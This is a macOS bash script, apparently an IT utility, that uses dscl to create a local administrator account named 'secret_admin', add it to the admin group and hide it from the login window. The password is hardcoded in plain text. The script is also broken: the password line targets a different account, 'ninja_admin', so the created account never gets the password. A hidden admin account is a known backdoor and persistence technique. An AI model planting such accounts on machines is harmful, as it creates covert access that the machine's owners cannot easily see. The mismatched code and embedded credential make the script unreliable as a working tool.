#!/bin/bash
## This script will make a hidden local admin called Secret Admin that shouldn't be visible in users/groups##
## The first section is to create a user with ID 401 (can be anything between 400-499) and set it's primary group to the Administrators group.##
sudo dscl . -create /Users/secret_admin UniqueID 401
sudo dscl . -create /Users/secret_admin PrimaryGroupID 80
sudo dscl . -create /Users/secret_admin NFSHomeDirectory /var/secret_admin
sudo dscl . -create /Users/secret_admin UserShell /bin/bash
sudo dscl . -create /Users/secret_admin RealName "Secret Admin"
sudo dscl . -passwd /Users/ninja_admin p0l1cy$aysn0t0K
## This should create the user folder, set ownership and make the Secret Admin an admin. This MAY be unnecessary. ##
sudo mkdir /var/secret_admin 
sudo chown -R secret_admin /var/secret_admin
sudo dscl . append /Groups/admin GroupMembership secret_admin
sudo defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool YES
sudo defaults write /Library/Preferences/com.apple.loginwindow SHOWOTHERUSERS_MANAGED -bool TRUE
## Log out and log in with Secret Admin, then login with normal user- check login window.##
